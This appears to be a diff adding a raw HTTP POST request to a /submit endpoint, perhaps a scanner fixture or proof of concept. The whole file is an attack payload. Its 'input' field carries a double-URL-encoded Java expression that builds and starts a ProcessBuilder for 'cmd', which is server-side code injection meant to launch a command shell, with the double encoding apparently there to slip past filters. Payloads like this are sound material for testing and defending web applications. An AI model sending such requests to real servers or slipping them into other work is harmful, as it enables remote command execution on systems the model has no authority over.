@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+Connection: close
+
+input=j%253Dnew%2BProcessBuilder%2528%2522cmd%2522%2529.start%2528%2529
